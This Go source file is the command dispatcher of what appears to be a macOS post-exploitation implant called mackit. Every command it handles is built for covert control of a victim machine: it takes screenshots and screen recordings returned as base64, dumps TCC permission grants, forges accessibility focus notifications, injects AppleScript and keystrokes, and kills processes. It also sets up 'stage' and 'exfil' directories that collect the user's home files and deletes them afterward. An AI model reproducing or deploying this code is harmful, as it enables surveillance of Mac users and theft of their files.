// mackit_commands.go – native mackit command dispatcher
//
// Commands prefixed with "__mackit__:" are intercepted in commandLoop and
// executed natively via the mackit packages instead of through a bash shell.
//
// ┌────────────────────────────────────────────────────────────────────┐
// │ Command reference                                                  │
// ├────────────────────────────────────────────────────────────────────┤
// │ SCREEN                                                             │
// │  screenshot                  full-screen JPEG as base64           │
// │  screenshot-window <name>    screenshot of a named window         │
// │  activewindow                currently focused window info        │
// │  windows                     list all visible windows             │
// │  record <seconds>            screen recording (mov → base64)      │
// │                                                                    │
// │ PROCESSES                                                          │
// │  procs                       formatted full process list          │
// │  pid <name>                  find PID by process name             │
// │  entitlements <pid|path>     codesign entitlements dump           │
// │  kill <pid>                  SIGKILL a PID                        │
// │  isrunning <name>            check if a process is running        │
// │                                                                    │
// │ TCC                                                                │
// │  tcc-recon                   dump TCC.db grants                   │
// │  tcc-livetest                probe TCC dirs directly              │
// │  tcc-check <service>         IsGranted for one service            │
// │  tcc-dbpaths                 show TCC.db file paths               │
// │                                                                    │
// │ ACCESSIBILITY (ax)                                                 │
// │  ax-enabled                  check Accessibility permission       │
// │  ax-attr <app> <attr>        read AX attribute from app window    │
// │  ax-children <app>           list UI children of app window       │
// │  ax-describe <path>          VoiceOver AX description of a file   │
// │  ax-focus <app> <path>       forge AXFocusChanged notification    │
// │                                                                    │
// │ SCRIPT                                                             │
// │  script <applescript>        run inline AppleScript               │
// │  notify <title> | <msg>      macOS notification                   │
// │  dialog <message>            blocking alert dialog                │
// │  keystroke <key> [mods...]   send keystroke (e.g. "c command")   │
// │  keycode <code> [mods...]    send raw key code                    │
// │  logwatch <proc> <secs>      tap unified log for a process        │
// │                                                                    │
// │ FILESYSTEM                                                         │
// │  fs-stage                    create symlink stage for std targets │
// │  fs-harvest                  list files in the stage              │
// │  fs-clean                    remove staging/exfil dirs            │
// └────────────────────────────────────────────────────────────────────┘

package main

import (
	"encoding/base64"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"time"

	"mackit/ax"
	"mackit/fs"
	"mackit/proc"
	"mackit/screen"
	"mackit/script"
	"mackit/tcc"
)

const mackitPrefix = "__mackit__:"

// isMackitCommand reports whether cmd should be dispatched natively.
func isMackitCommand(cmd string) bool {
	return strings.HasPrefix(cmd, mackitPrefix)
}

// executeMackitCommand runs a __mackit__: command and returns (output, exitCode).
func executeMackitCommand(cmd string) (string, int) {
	name := strings.TrimPrefix(cmd, mackitPrefix)
	// Split into op + rest; keep rest unsplit for args that may contain spaces.
	parts := strings.SplitN(name, " ", 2)
	op := parts[0]
	arg := ""
	if len(parts) > 1 {
		arg = strings.TrimSpace(parts[1])
	}

	log.Printf("[mackit] op=%s", op)

	switch op {

	// ── Screen ──────────────────────────────────────────────────────────────
	case "screenshot":
		return mackitScreenshot()
	case "screenshot-window":
		if arg == "" {
			return "usage: __mackit__:screenshot-window <window-name>", 1
		}
		return mackitScreenshotWindow(arg)
	case "activewindow":
		return mackitActiveWindow()
	case "windows":
		return mackitWindows()
	case "record":
		secs := 10
		if arg != "" {
			if n, err := strconv.Atoi(arg); err == nil {
				secs = n
			}
		}
		return mackitRecord(secs)

	// ── Processes ───────────────────────────────────────────────────────────
	case "procs":
		return mackitProcs()
	case "pid":
		if arg == "" {
			return "usage: __mackit__:pid <process-name>", 1
		}
		return mackitPID(arg)
	case "entitlements":
		if arg == "" {
			return "usage: __mackit__:entitlements <pid|/path/to/binary>", 1
		}
		return mackitEntitlements(arg)
	case "kill":
		if arg == "" {
			return "usage: __mackit__:kill <pid>", 1
		}
		return mackitKill(arg)
	case "isrunning":
		if arg == "" {
			return "usage: __mackit__:isrunning <process-name>", 1
		}
		if proc.IsRunning(arg) {
			return fmt.Sprintf("%s is running", arg), 0
		}
		return fmt.Sprintf("%s is NOT running", arg), 0

	// ── TCC ─────────────────────────────────────────────────────────────────
	case "tcc-recon":
		return mackitTCCRecon()
	case "tcc-livetest":
		return mackitTCCLiveTest()
	case "tcc-check":
		if arg == "" {
			return "usage: __mackit__:tcc-check <service-key>  (e.g. kTCCServiceScreenCapture)", 1
		}
		granted := tcc.IsGranted(tcc.Service(arg))
		if granted {
			return fmt.Sprintf("✅ %s: GRANTED", arg), 0
		}
		return fmt.Sprintf("❌ %s: NOT GRANTED", arg), 0
	case "tcc-dbpaths":
		user, system := tcc.DBPaths()
		return fmt.Sprintf("User:   %s\nSystem: %s", user, system), 0

	// ── Accessibility ────────────────────────────────────────────────────────
	case "ax-enabled":
		if ax.IsAccessibilityEnabled() {
			return "✅ Accessibility: ENABLED", 0
		}
		return "❌ Accessibility: DISABLED", 0
	case "ax-attr":
		// arg: "<App> <AXAttribute>"  e.g. "Safari AXTitle"
		return mackitAXAttr(arg)
	case "ax-children":
		if arg == "" {
			return "usage: __mackit__:ax-children <App>", 1
		}
		return mackitAXChildren(arg)
	case "ax-describe":
		if arg == "" {
			return "usage: __mackit__:ax-describe </path/to/file>", 1
		}
		return mackitAXDescribe(arg)
	case "ax-focus":
		// arg: "<App> <path>"
		return mackitAXFocus(arg)

	// ── Script ──────────────────────────────────────────────────────────────
	case "script":
		if arg == "" {
			return "usage: __mackit__:script <applescript>", 1
		}
		out, err := script.Run(arg)
		if err != nil {
			return err.Error(), 1
		}
		return out, 0
	case "notify":
		// arg: "<title> | <message>"
		return mackitNotify(arg)
	case "dialog":
		if arg == "" {
			return "usage: __mackit__:dialog <message>", 1
		}
		if err := script.Dialog(arg); err != nil {
			return err.Error(), 1
		}
		return "dialog shown", 0
	case "keystroke":
		// arg: "<key> [modifier ...]"  e.g. "c command shift"
		return mackitKeystroke(arg)
	case "keycode":
		// arg: "<code> [modifier ...]"  e.g. "6 command"
		return mackitKeyCode(arg)
	case "logwatch":
		// arg: "<process-name> <seconds>"
		return mackitLogWatch(arg)

	// ── Filesystem ──────────────────────────────────────────────────────────
	case "fs-stage":
		return mackitFSStage()
	case "fs-harvest":
		return mackitFSHarvest()
	case "fs-clean":
		return mackitFSClean()

	default:
		return fmt.Sprintf("[mackit] unknown command: %q", op), 1
	}
}

// ─── Screen ───────────────────────────────────────────────────────────────────

func mackitScreenshot() (string, int) {
	tmp, err := os.CreateTemp("", "mackit-sc-*.jpg")
	if err != nil {
		return fmt.Sprintf("screenshot: create temp: %v", err), 1
	}
	tmp.Close()
	path := tmp.Name()
	defer os.Remove(path)

	res, err := screen.Capture(screen.Options{
		Output:        path,
		Format:        "jpg",
		AsConsoleUser: true,
	})
	if err != nil {
		return fmt.Sprintf("screenshot: %v", err), 1
	}

	data, err := os.ReadFile(res.Path)
	if err != nil {
		return fmt.Sprintf("screenshot: read file: %v", err), 1
	}
	return base64.StdEncoding.EncodeToString(data), 0
}

func mackitScreenshotWindow(name string) (string, int) {
	tmp, err := os.CreateTemp("", "mackit-win-*.jpg")
	if err != nil {
		return fmt.Sprintf("screenshot-window: create temp: %v", err), 1
	}
	tmp.Close()
	path := tmp.Name()
	defer os.Remove(path)

	res, err := screen.CaptureWindow(name, screen.Options{
		Output:        path,
		Format:        "jpg",
		AsConsoleUser: true,
	})
	if err != nil {
		return fmt.Sprintf("screenshot-window: %v", err), 1
	}
	data, err := os.ReadFile(res.Path)
	if err != nil {
		return fmt.Sprintf("screenshot-window: read: %v", err), 1
	}
	return base64.StdEncoding.EncodeToString(data), 0
}

func mackitActiveWindow() (string, int) {
	w, err := screen.ActiveWindow()
	if err != nil {
		return fmt.Sprintf("activewindow: %v", err), 1
	}
	return fmt.Sprintf("ID:    %d\nApp:   %s\nTitle: %s", w.ID, w.Owner, w.Name), 0
}

func mackitWindows() (string, int) {
	windows, err := screen.WindowList()
	if err != nil {
		return fmt.Sprintf("WindowList: %v", err), 1
	}
	if len(windows) == 0 {
		return "No windows found.", 0
	}
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("%-6s  %-22s  %s\n", "ID", "APP", "TITLE"))
	sb.WriteString(strings.Repeat("─", 60) + "\n")
	for _, w := range windows {
		sb.WriteString(fmt.Sprintf("%-6d  %-22s  %s\n", w.ID, w.Owner, w.Name))
	}
	return sb.String(), 0
}

func mackitRecord(secs int) (string, int) {
	tmp, err := os.CreateTemp("", "mackit-rec-*.mov")
	if err != nil {
		return fmt.Sprintf("record: create temp: %v", err), 1
	}
	tmp.Close()
	path := tmp.Name()
	defer os.Remove(path)

	rec, err := screen.Record(screen.RecordOptions{
		Output:   path,
		Duration: secs,
	})
	if err != nil {
		return fmt.Sprintf("record: start: %v", err), 1
	}
	if err := rec.Wait(); err != nil {
		// screencapture exits non-zero on SIGINT stop — ignore it.
		log.Printf("[mackit] record finished: %v", err)
	}

	data, err := os.ReadFile(path)
	if err != nil {
		return fmt.Sprintf("record: read: %v", err), 1
	}
	return base64.StdEncoding.EncodeToString(data), 0
}

// ─── Processes ────────────────────────────────────────────────────────────────

func mackitProcs() (string, int) {
	procs, err := proc.List()
	if err != nil {
		return fmt.Sprintf("proc.List: %v", err), 1
	}
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("%-6s  %-6s  %-12s  %s\n", "PID", "PPID", "USER", "NAME"))
	sb.WriteString(strings.Repeat("─", 60) + "\n")
	for _, p := range procs {
		sb.WriteString(fmt.Sprintf("%-6d  %-6d  %-12s  %s\n", p.PID, p.PPID, p.User, p.Name))
	}
	return sb.String(), 0
}

func mackitPID(name string) (string, int) {
	pid, err := proc.GetPID(name)
	if err != nil {
		return fmt.Sprintf("pid: %v", err), 1
	}
	return fmt.Sprintf("%s → PID %d", name, pid), 0
}

func mackitEntitlements(arg string) (string, int) {
	// Accept either a PID (integer) or a path.
	if pid, err := strconv.Atoi(arg); err == nil {
		out, err := proc.Entitlements(pid)
		if err != nil {
			return fmt.Sprintf("entitlements(%d): %v", pid, err), 1
		}
		return out, 0
	}
	out, err := proc.EntitlementsPath(arg)
	if err != nil {
		return fmt.Sprintf("entitlements(%s): %v", arg, err), 1
	}
	return out, 0
}

func mackitKill(arg string) (string, int) {
	pid, err := strconv.Atoi(arg)
	if err != nil {
		return fmt.Sprintf("kill: invalid pid %q: %v", arg, err), 1
	}
	if err := proc.Kill(pid); err != nil {
		return fmt.Sprintf("kill(%d): %v", pid, err), 1
	}
	return fmt.Sprintf("killed PID %d", pid), 0
}

// ─── TCC ──────────────────────────────────────────────────────────────────────

func mackitTCCRecon() (string, int) {
	grants, err := tcc.Recon()
	if err != nil {
		fallback := fmt.Sprintf("TCC.db query failed: %v\n\n%s", err, formatLiveTest())
		return fallback, 0
	}

	byService := map[tcc.Service][]tcc.Grant{}
	for _, g := range grants {
		byService[g.Service] = append(byService[g.Service], g)
	}

	services := make([]tcc.Service, 0, len(tcc.ServiceName))
	for svc := range tcc.ServiceName {
		services = append(services, svc)
	}
	sort.Slice(services, func(i, j int) bool {
		return tcc.ServiceName[services[i]] < tcc.ServiceName[services[j]]
	})

	var sb strings.Builder
	sb.WriteString("TCC Database Recon\n")
	sb.WriteString(strings.Repeat("─", 55) + "\n")
	for _, svc := range services {
		gs := byService[svc]
		if len(gs) == 0 {
			continue
		}
		label := tcc.ServiceName[svc]
		for _, g := range gs {
			sb.WriteString(fmt.Sprintf("%-20s  %-8s  %s\n", label, g.AuthValue, g.Client))
		}
	}
	return sb.String(), 0
}

func mackitTCCLiveTest() (string, int) {
	return formatLiveTest(), 0
}

func formatLiveTest() string {
	results := tcc.LiveTest()
	var sb strings.Builder
	sb.WriteString("TCC Live Access Test\n")
	sb.WriteString(strings.Repeat("─", 55) + "\n")
	for _, r := range results {
		label := tcc.ServiceName[r.Service]
		if r.Allowed {
			sb.WriteString(fmt.Sprintf("✅  %-16s  %d entries\n", label, r.Entries))
		} else {
			sb.WriteString(fmt.Sprintf("❌  %-16s  %s\n", label, r.ErrorMsg))
		}
	}
	return sb.String()
}

// ─── Accessibility ────────────────────────────────────────────────────────────

func mackitAXAttr(arg string) (string, int) {
	// arg: "<App> <AXAttribute>"
	parts := strings.SplitN(arg, " ", 2)
	if len(parts) < 2 {
		return "usage: __mackit__:ax-attr <App> <AXAttribute>  (e.g. Safari AXTitle)", 1
	}
	app, attr := parts[0], parts[1]
	val, err := ax.GetAttribute(ax.Element{App: app}, attr)
	if err != nil {
		return fmt.Sprintf("ax-attr: %v", err), 1
	}
	return fmt.Sprintf("%s.%s = %s", app, attr, val), 0
}

func mackitAXChildren(app string) (string, int) {
	children, err := ax.ListChildren(ax.Element{App: app})
	if err != nil {
		return fmt.Sprintf("ax-children: %v", err), 1
	}
	if len(children) == 0 {
		return "No children found.", 0
	}
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("UI children of %s\n", app))
	sb.WriteString(strings.Repeat("─", 40) + "\n")
	for _, c := range children {
		sb.WriteString(c + "\n")
	}
	return sb.String(), 0
}

func mackitAXDescribe(path string) (string, int) {
	desc, err := ax.GetDescription(path)
	if err != nil {
		return fmt.Sprintf("ax-describe: %v", err), 1
	}
	return desc, 0
}

func mackitAXFocus(arg string) (string, int) {
	// arg: "<App> <path>"
	parts := strings.SplitN(arg, " ", 2)
	if len(parts) < 2 {
		return "usage: __mackit__:ax-focus <App> </path/to/file>", 1
	}
	app, path := parts[0], parts[1]
	if err := ax.PostFocusChanged(app, path); err != nil {
		return fmt.Sprintf("ax-focus: %v", err), 1
	}
	return fmt.Sprintf("AXFocusChanged posted to %s for %s", app, path), 0
}

// ─── Script ───────────────────────────────────────────────────────────────────

func mackitNotify(arg string) (string, int) {
	// arg: "<title> | <message>"
	parts := strings.SplitN(arg, "|", 2)
	title, msg := strings.TrimSpace(parts[0]), ""
	if len(parts) == 2 {
		msg = strings.TrimSpace(parts[1])
	}
	if title == "" {
		return "usage: __mackit__:notify <title> | <message>", 1
	}
	if err := script.Notify(title, msg); err != nil {
		return fmt.Sprintf("notify: %v", err), 1
	}
	return "notification sent", 0
}

func mackitKeystroke(arg string) (string, int) {
	// arg: "<key> [modifier ...]"  e.g. "c command shift"
	parts := strings.Fields(arg)
	if len(parts) == 0 {
		return "usage: __mackit__:keystroke <key> [modifier ...]  (modifiers: command option shift control)", 1
	}
	key, mods := parts[0], parts[1:]
	if err := script.Keystroke(key, mods...); err != nil {
		return fmt.Sprintf("keystroke: %v", err), 1
	}
	return fmt.Sprintf("keystroke %q sent", key), 0
}

func mackitKeyCode(arg string) (string, int) {
	// arg: "<code> [modifier ...]"  e.g. "6 command"
	parts := strings.Fields(arg)
	if len(parts) == 0 {
		return "usage: __mackit__:keycode <code> [modifier ...]", 1
	}
	code, err := strconv.Atoi(parts[0])
	if err != nil {
		return fmt.Sprintf("keycode: invalid code %q", parts[0]), 1
	}
	mods := parts[1:]
	if err := script.KeyCode(code, mods...); err != nil {
		return fmt.Sprintf("keycode: %v", err), 1
	}
	return fmt.Sprintf("key code %d sent", code), 0
}

func mackitLogWatch(arg string) (string, int) {
	// arg: "<process-name> <seconds>"
	parts := strings.SplitN(arg, " ", 2)
	if len(parts) < 2 {
		return "usage: __mackit__:logwatch <process-name> <seconds>", 1
	}
	processName := parts[0]
	secs, err := strconv.Atoi(strings.TrimSpace(parts[1]))
	if err != nil || secs <= 0 {
		return "logwatch: seconds must be a positive integer", 1
	}
	lines, err := script.CaptureLog(processName, time.Duration(secs)*time.Second, nil)
	if err != nil {
		return fmt.Sprintf("logwatch: %v", err), 1
	}
	if len(lines) == 0 {
		return fmt.Sprintf("logwatch: no output from %s in %ds", processName, secs), 0
	}
	return strings.Join(lines, "\n"), 0
}

// ─── Filesystem ───────────────────────────────────────────────────────────────

// stageDir and exfilDir are shared across fs-stage / fs-harvest / fs-clean
// within one agent session.
var (
	globalStageDir string
	globalExfilDir string
)

func mackitFSStage() (string, int) {
	home, _ := os.UserHomeDir()
	targets := fs.StandardTargets(home)

	stageDir, err := fs.CreateSymlinkStage("mackit", targets)
	if err != nil {
		return fmt.Sprintf("fs-stage: %v", err), 1
	}
	exfilDir, err := fs.CreateExfilDir("mackit")
	if err != nil {
		return fmt.Sprintf("fs-stage: exfil dir: %v", err), 1
	}
	globalStageDir = stageDir
	globalExfilDir = exfilDir

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Stage dir:  %s\n", stageDir))
	sb.WriteString(fmt.Sprintf("Exfil dir:  %s\n", exfilDir))
	sb.WriteString("Symlinks:\n")
	for name, target := range targets {
		sb.WriteString(fmt.Sprintf("  %s → %s\n", filepath.Join(stageDir, name), target))
	}
	return sb.String(), 0
}

func mackitFSHarvest() (string, int) {
	if globalStageDir == "" {
		return "fs-harvest: no stage dir — run __mackit__:fs-stage first", 1
	}
	results, err := fs.Harvest(globalStageDir)
	if err != nil {
		return fmt.Sprintf("fs-harvest: %v", err), 1
	}
	if len(results) == 0 {
		return "fs-harvest: no files found in stage.", 0
	}
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("%-12s  %-24s  %s\n", "SIZE", "MODIFIED", "PATH"))
	sb.WriteString(strings.Repeat("─", 70) + "\n")
	for _, r := range results {
		sb.WriteString(fmt.Sprintf("%-12d  %-24s  %s\n",
			r.Size,
			r.ModTime.Format("2006-01-02 15:04:05"),
			r.Path,
		))
	}
	sb.WriteString(fmt.Sprintf("\n%d file(s) found.", len(results)))
	return sb.String(), 0
}

func mackitFSClean() (string, int) {
	var paths []string
	if globalStageDir != "" {
		paths = append(paths, globalStageDir)
	}
	if globalExfilDir != "" {
		paths = append(paths, globalExfilDir)
	}
	if len(paths) == 0 {
		return "fs-clean: nothing to clean (no stage/exfil dirs set).", 0
	}
	if err := fs.CleanStage(paths...); err != nil {
		return fmt.Sprintf("fs-clean: %v", err), 1
	}
	removed := strings.Join(paths, ", ")
	globalStageDir = ""
	globalExfilDir = ""
	return fmt.Sprintf("Removed: %s", removed), 0
}
